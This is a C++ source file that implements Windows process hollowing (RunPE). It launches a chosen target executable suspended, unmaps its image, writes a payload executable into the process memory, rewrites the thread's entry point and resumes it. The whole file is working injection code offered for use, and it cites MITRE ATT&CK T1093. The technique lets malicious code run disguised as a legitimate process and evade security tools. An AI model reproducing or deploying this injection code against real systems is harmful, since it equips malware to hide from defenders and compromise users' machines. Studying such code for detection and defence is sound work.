#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#pragma comment(lib,"ntdll.lib")
using namespace std;

/*
** Process Hollowing (A.K.A Process Replacement And Runpe)
** Reference:
** [1] - https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
** [2] - https://attack.mitre.org/wiki/Technique/T1093
** [3] - http://www.rohitab.com/discuss/topic/40262-dynamic-forking-process-hollowing/
** [4] - http://www.rohitab.com/discuss/topic/43186-process-hollowing-dynamic-forking-questions-from-a-novice-researcher/
*/

EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);

int main(int argc, char const *argv[])
{
	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_SECTION_HEADER pISH;

	PVOID image, mem, base;
	DWORD i, read, nSizeOfFile;
	HANDLE hFile;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;

	ctx.ContextFlags = CONTEXT_FULL;

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	char tmpTargetProcess[256], targetProcess[256];
	char tmpPayloadProcess[256], payloadProcess[256];

	// Process Target Process
	cout << "Example: crackme, basecalc,.." << endl;
	cout << "Enter Target Process Name: "; rewind(stdin);
	cin.getline(tmpTargetProcess, sizeof(tmpTargetProcess));
	strcpy(targetProcess, strcat(tmpTargetProcess, ".exe"));

	// Process Payload Process
	cout << "Enter Payload Process Name: "; rewind(stdin);
	cin.getline(tmpPayloadProcess, sizeof(tmpPayloadProcess));
	strcpy(payloadProcess, strcat(tmpPayloadProcess, ".exe"));

	// Starting Injection
	cout << "[ Starting ] Process Hollowing Injection (Dynamic Forking/RunPE)" << endl;
	cout << "[ Open ] Run the Target executable!" << endl;
	if (!CreateProcess(NULL, targetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		cout << "[ Error ] Unable to run the target executable. CreateProcess failed with error!" << GetLastError() << endl;
		return 1;
	}

	cout << "[ Suspended ] Process created in suspended state" << endl;
	cout << "[ Open ] Opening the payload executable" << endl;
	hFile = CreateFile(payloadProcess, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		cout << "[ Error ] Unable to open the replacement executable. CreateFile failed with error!" << GetLastError() << endl;
		// Failed, terminate the child process.
		NtTerminateProcess(pi.hProcess, 1); 
		return 1;
	}

	// Get the size of the payload executable
	nSizeOfFile = GetFileSize(hFile, NULL); 

	// Allocate memory for the payload executable file
	image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 

	// Read the payload executable file from disk
	if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL)) 
	{
		cout << "[ Error ] Unable to read the replacement executable. ReadFile failed with error" << GetLastError() << endl;
		// Failed, terminate the child process.
		NtTerminateProcess(pi.hProcess, 1); 
		return 1;
	}

	// Close the file handle
	NtClose(hFile); 

	pIDH = (PIMAGE_DOS_HEADER)image;
	// Check for valid executable
	if (pIDH->e_magic != IMAGE_DOS_SIGNATURE)
	{
		cout << "[ Error ] Error: Invalid executable format!" << GetLastError() << endl;
		// Failed, terminate the child process.
		NtTerminateProcess(pi.hProcess, 1); 
		return 1;
	}

	// Get the address of the IMAGE_NT_HEADERS
	pINH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pIDH->e_lfanew);

	// Get the thread context of the child process's primary thread
	NtGetContextThread(pi.hThread, &ctx);

	// Get the PEB address from the ebx register and read the base address of the executable image from the PEB
	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &base, sizeof(PVOID), NULL); 

	if ((DWORD)base == pINH->OptionalHeader.ImageBase) // If the original image has same base address as the replacement executable, unmap the original executable from the child process.
	{
		cout << "Unmapping original executable image from child process!" << hex << base << endl;
		// Unmap the executable image using NtUnmapViewOfSection function
		NtUnmapViewOfSection(pi.hProcess, base); 
	}

	cout << "[ Allocating ] Allocating memory in child process" << endl;
	// Allocate memory for the executable image
	mem = VirtualAllocEx(pi.hProcess, (PVOID)pINH->OptionalHeader.ImageBase, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!mem)
	{
		cout << "[ Error ] Error: Unable to allocate memory in child process. VirtualAllocEx failed with error" << GetLastError() << endl;
		// We failed, terminate the child process.
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}

	cout << "Memory allocated. Address: " << mem << endl;
	cout << "[ Writing ] Writing executable image into child process" << endl;
	// Write the header of the replacement executable into child process
	NtWriteVirtualMemory(pi.hProcess, mem, image, pINH->OptionalHeader.SizeOfHeaders, NULL);
	for (i = 0; i < pINH->FileHeader.NumberOfSections; i++)
	{
		pISH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		// Write the remaining sections of the replacement executable into child process
		NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)mem + pISH->VirtualAddress), (PVOID)((LPBYTE)image + pISH->PointerToRawData), pISH->SizeOfRawData, NULL);
	}

	// Set the eax register to the entry point of the injected image
	ctx.Eax = (DWORD)((LPBYTE)mem + pINH->OptionalHeader.AddressOfEntryPoint);
	cout << "New entry point:" << hex << ctx.Eax << endl;

	// Write the base address of the injected image into the PEB
	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &pINH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); 

	cout << "Setting the context of the child process's primary thread" << endl;
	// Set the thread context of the child process's primary thread
	NtSetContextThread(pi.hThread, &ctx); 

	// Resume the primary thread
	NtResumeThread(pi.hThread, NULL);
	cout << "[ Resumed ] Thread resumed" << endl;

	cout << "Waiting for child process to terminate" << endl;
	NtWaitForSingleObject(pi.hProcess, FALSE, NULL);
	cout << "Process terminated" << endl;

	// Close the thread handle
	NtClose(pi.hThread); 
	// Close the process handle
	NtClose(pi.hProcess);

	// Free the allocated memory
	VirtualFree(image, 0, MEM_RELEASE);

	cout << "[ Exit ] Press any key to exit!";
	getchar();
	return 0;
}